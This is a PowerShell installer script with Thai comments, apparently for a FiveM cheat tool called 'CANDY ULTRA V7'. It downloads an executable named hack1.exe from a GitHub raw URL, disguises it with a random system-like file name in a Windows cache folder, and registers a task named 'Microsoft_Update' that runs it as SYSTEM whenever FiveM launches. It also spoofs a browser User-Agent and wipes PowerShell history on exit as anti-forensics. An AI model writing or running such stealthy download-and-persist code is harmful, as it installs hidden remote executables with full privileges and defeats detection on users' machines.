# สุ่มชื่อไฟล์ให้ดูเหมือนไฟล์ Cache หรือไฟล์ระบบของ User
$p_rand = @("font","drv","host","win","svc") | Get-Random
$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$fileName = "$p_rand$m_rand`_$r_rand.exe"
$taskName = "Microsoft_Update_$r_rand"

# เปลี่ยนจาก System32 มาเป็น LocalAppData เพื่อความเนียนและติดตั้งง่ายกว่า
$destFolder = "$env:LOCALAPPDATA\Microsoft\Windows\Caches"
if (!(Test-Path $destFolder)) { New-Item -Path $destFolder -ItemType Directory -Force }
$destPath = "$destFolder\$fileName"

$exeUrl = "https://raw.githubusercontent.com/backmrpun-hash/PS/refs/heads/main/hack1.exe"

while ($true) {
    Clear-Host
    Write-Host "--- CANDY ULTRA V7 MANAGER ---" -ForegroundColor Magenta
    Write-Host "1. Install & Persistence (Auto-run with FiveM)"
    Write-Host "2. Check Status"
    Write-Host "3. Self-Destruct (Uninstall)"
    Write-Host "0. Exit"
    Write-Host "------------------------------"
    
    $choice = Read-Host "Select Option"

    if ($choice -eq "1") {
        Clear-Host
        Write-Host "[*] Configuring Stealth System..." -ForegroundColor Cyan

        try {
            # ดาวน์โหลดไฟล์โดยปลอม User-Agent เป็น Browser ปกติ
            $web = New-Object System.Net.WebClient
            $web.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $web.DownloadFile($exeUrl, $destPath)
            
            Unblock-File -Path $destPath

            # เปิดการ Log Process เพื่อใช้เป็นเงื่อนไขในการรัน (Trigger)
            auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null

            # สร้าง XML Filter สำหรับดึงเหตุการณ์ตอนเปิด FiveM
            # ปรับปรุง: ใช้เงื่อนไขที่กว้างขึ้นเพื่อรองรับ FiveM หลาย Build
            $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName'] and (contains(.,'FiveM.exe') or contains(.,'FiveM_GTAProcess.exe'))]]"
            
            # สร้าง Task Scheduler ให้รัน $destPath เมื่อเจอ Event เปิด FiveM
            schtasks /create /tn "$taskName" /tr "'$destPath'" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f | Out-Null

            Write-Host "[+] Installation Successful!" -ForegroundColor Green
            Write-Host "[!] The engine will activate silently when FiveM starts." -ForegroundColor Yellow
        }
        catch {
            Write-Host "[X] Failure: $($_.Exception.Message)" -ForegroundColor Red
        }
        pause
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Write-Host "--- SYSTEM STATUS ---" -ForegroundColor Cyan
        if (Test-Path $destPath) {
            $taskCheck = schtasks /query /tn "$taskName" 2>$null
            if ($taskCheck) { Write-Host "Status: ACTIVE & PERSISTENT" -ForegroundColor Green }
            else { Write-Host "Status: FILE READY (TASK MISSING)" -ForegroundColor Yellow }
            Write-Host "Location: $destPath"
        } else {
            Write-Host "Status: NOT INSTALLED" -ForegroundColor Red
        }
        pause
    }
    elseif ($choice -eq "3") {
        # ระบบถอนการติดตั้งและลบหลักฐาน
        schtasks /delete /tn "$taskName" /f 2>$null
        Remove-Item $destPath -Force -ErrorAction SilentlyContinue
        Write-Host "[+] All traces removed." -ForegroundColor Green
        pause
    }
    elseif ($choice -eq "0") {
        # ลบประวัติการพิมพ์คำสั่งทั้งหมด (Anti-Forensics)
        $historyPath = (Get-PSReadlineOption).HistorySavePath
        if (Test-Path $historyPath) { Clear-Content $historyPath -Force }
        Clear-History
        exit
    }
}
